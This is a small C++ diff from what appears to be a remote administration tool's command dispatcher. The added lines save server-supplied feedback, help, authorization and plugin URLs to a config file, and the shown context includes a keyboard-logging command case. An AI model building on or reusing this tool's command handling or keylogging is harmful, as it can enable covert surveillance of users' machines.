@@ -903,6 +903,15 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             }
             Logger::getInstance().usingLog(m_settings.EnableLog);
         }
+        if (IsAuthKernel() && 
+            (m_settings.FeedbackUrl[0] || m_settings.HelpUrl[0] || m_settings.RequestAuthUrl[0] || m_settings.GetPluginUrl[0])) {
+            config* THIS_CFG = IsDebug ? new config : new iniFile;
+            if (m_settings.FeedbackUrl[0])THIS_CFG->SetStr("settings", "FeedbackUrl", m_settings.FeedbackUrl);
+            if (m_settings.HelpUrl[0])THIS_CFG->SetStr("settings", "HelpUrl", m_settings.HelpUrl);
+            if (m_settings.RequestAuthUrl[0])THIS_CFG->SetStr("settings", "RequestAuthUrl", m_settings.RequestAuthUrl);
+            if (m_settings.GetPluginUrl[0])THIS_CFG->SetStr("settings", "GetPluginUrl", m_settings.GetPluginUrl);
+            delete THIS_CFG;
+        }
         break;
     case COMMAND_KEYBOARD: { //键盘记录
         if (m_hKeyboard) {
